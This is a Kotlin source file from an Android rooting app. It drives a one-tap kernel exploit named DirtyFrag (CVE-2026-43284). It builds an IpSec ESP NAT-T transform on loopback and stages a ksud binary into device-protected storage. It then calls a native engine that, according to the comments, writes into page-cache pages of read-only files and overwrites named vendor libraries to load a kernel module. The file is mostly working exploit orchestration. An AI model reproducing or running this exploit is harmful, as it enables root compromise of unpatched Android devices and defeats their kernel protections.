package com.agnessu.yakayn.data.dirtyfrag

import android.content.Context
import android.annotation.SuppressLint
import android.net.IpSecAlgorithm
import android.net.IpSecManager
import android.net.IpSecTransform
import android.os.Build
import androidx.annotation.RequiresApi
import df.root.ExploitRunner
import df.root.IReporter
import java.io.File
import java.net.DatagramSocket
import java.net.InetAddress
import java.security.SecureRandom
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch

/**
 * One-tap DirtyFrag (CVE-2026-43284) root orchestrator. Runs entirely in the
 * app domain: the native engine performs the xfrm-ESP page-cache write chain
 * itself (pipe/vmsplice/splice + UDP), so unlike the Samsung engine there is no
 * Shizuku/shell transport. The repository sets up the IpSecManager ESP NAT-T
 * transform the native primitive relies on, stages AgnesSU's ksud into
 * device-protected storage (the path the embedded ko blobs execute), then
 * invokes [ExploitRunner.nativeRunAll].
 */
class DirtyFragRepository(private val context: Context) {

    private val _state = MutableStateFlow(DirtyFragUiState())
    val state: StateFlow<DirtyFragUiState> = _state.asStateFlow()

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var installJob: Job? = null

    val snapshot: DirtyFragDeviceSnapshot by lazy { DirtyFragDeviceSnapshot.current() }

    init {
        scope.launch {
            _state.value = DirtyFragUiState(
                phase = DirtyFragInstallPhase.Ready,
                log = "kernel: ${snapshot.kernelVersionFull}",
            )
        }
    }

    @SuppressLint("NewApi")
    fun install() {
        if (installJob?.isActive == true) return
        installJob = scope.launch {
            _state.value = DirtyFragUiState(phase = DirtyFragInstallPhase.Checking, log = "")
            try {
                require(snapshot.isAarch64) { "aarch64 required" }
                require(snapshot.isApiSupported) { "Android 10+ required" }
                val reporter = object : IReporter {
                    override fun report(message: String) = appendLog(message)
                }
                setPhase(DirtyFragInstallPhase.Exploiting, "[*] Running DirtyFrag (CVE-2026-43284)")
                val code = runExploit(reporter)
                require(code == 0) { "DirtyFrag returned $code" }
                setPhase(DirtyFragInstallPhase.Installed, "[*] AgnesSU active")
                appendLog("[*] Root complete")
            } catch (error: Throwable) {
                appendLog("[-] ${error.message ?: error.javaClass.simpleName}")
                setPhase(DirtyFragInstallPhase.Failed, "[*] Root failed")
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.Q)
    private fun runExploit(reporter: IReporter): Int {
        val koTarget = detectKoTarget(reporter)
        val ipsec = context.getSystemService(Context.IPSEC_SERVICE) as IpSecManager

        // NAT-T UDP encapsulation socket: the kernel decrypts crafted ESP
        // packets in-place on pages the native engine spliced from read-only
        // files. encapPort is where the native sender connects to.
        val encapSock = ipsec.openUdpEncapsulationSocket()
        val encapPort = encapSock.port

        // Source port for the native sender. The native engine opens its own
        // UDP socket and bind()s it to this port (see patch_file_cbc), so we
        // only reserve a free ephemeral port here and release it immediately —
        // exactly how DFRoot's ExploitRunner does it. Keeping it bound would
        // make the native bind() fail with EADDRINUSE.
        val senderPort = DatagramSocket().use { it.localPort }

        // DFRoot uses the IPv4 loopback explicitly: openUdpEncapsulationSocket()
        // is IPv4, and the destination address family must match it. InetAddress
        // .getLoopbackAddress() returns ::1 (IPv6), which makes
        // buildTransportModeTransform throw "UDP encapsulation socket and
        // destination address families must match".
        val loopback = InetAddress.getByName("127.0.0.1")
        val spi = ipsec.allocateSecurityParameterIndex(loopback)

        val aesKey = ByteArray(32)
        val hmacKey = ByteArray(32)
        val random = SecureRandom()
        random.nextBytes(aesKey)
        random.nextBytes(hmacKey)

        // setIpv4Encapsulation applies the NAT-T transform to the encapsulation
        // socket in both directions, so no separate applyTransportModeTransform
        // call is needed (matches DFRoot's ExploitRunner).
        val transform = IpSecTransform.Builder(context)
            .setEncryption(IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey))
            .setAuthentication(IpSecAlgorithm(IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, 128))
            .setIpv4Encapsulation(encapSock, senderPort)
            .buildTransportModeTransform(loopback, spi)

        try {
            stageKsud(reporter)
            return ExploitRunner.nativeRunAll(
                reporter = reporter,
                koTarget = koTarget,
                encapPort = encapPort,
                spi = spi.spi,
                aesCbcKey = aesKey,
                hmacKey = hmacKey,
                icvLen = ICV_LEN_BYTES,
                senderPort = senderPort,
                softReboot = false,
            )
        } finally {
            runCatching { transform.close() }
            runCatching { spi.close() }
            runCatching { encapSock.close() }
        }
    }

    /**
     * The embedded dirtyfrag_ko_* blobs overwrite a vendor library with the
     * module and later usermodehelper_exec it from the staged ksud path, so a
     * readable vendor lib that exists on the device is the ko target. Order
     * matches the DFRoot fast-channel probe.
     */
    private fun detectKoTarget(reporter: IReporter): String {
        for (path in KO_TARGET_CANDIDATES) {
            if (File(path).exists()) {
                reporter.report("[*] ko target: $path")
                return path
            }
        }
        reporter.report("[*] ko target (default): ${KO_TARGET_CANDIDATES[0]}")
        return KO_TARGET_CANDIDATES[0]
    }

    /**
     * Copy AgnesSU's bundled ksud (libksud.so) to
     * `/data/user_de/0/com.agnessu.yakayn/ksud` — the exact path the embedded
     * kernel modules execute via `late-load --allow-shell --package-name`.
     */
    private fun stageKsud(reporter: IReporter) {
        val ksud = File(context.applicationInfo.nativeLibraryDir, "libksud.so")
        require(ksud.isFile) { "libksud.so missing from native library dir" }
        val target = File(context.createDeviceProtectedStorageContext().filesDir.parentFile, "ksud")
        if (target.isFile && target.length() == ksud.length()) {
            reporter.report("[*] ksud already staged")
            return
        }
        ksud.inputStream().use { input ->
            target.outputStream().use { output -> input.copyTo(output) }
        }
        target.setExecutable(true, false)
        reporter.report("[*] ksud staged -> ${target.absolutePath}")
    }

    private fun setPhase(phase: DirtyFragInstallPhase, message: String) {
        _state.value = _state.value.copy(phase = phase)
        appendLog(message)
    }

    private fun appendLog(line: String) {
        val cleanLine = stripAnsi(line).trim()
        if (cleanLine.isBlank()) return
        _state.value = _state.value.copy(
            log = (_state.value.log + "\n" + cleanLine).trim(),
        )
    }

    companion object {
        private const val ICV_LEN_BYTES = 16
        private val KO_TARGET_CANDIDATES = arrayOf(
            "/vendor/lib64/libbinderdebug.so",
            "/vendor/lib64/libstagefrighthw.so",
            "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
        )
        private val ANSI_ESCAPE = Regex("\u001B\\[[0-?]*[ -/]*[@-~]")

        private fun stripAnsi(value: String): String =
            ANSI_ESCAPE.replace(value, "").replace("\r", "")
    }
}
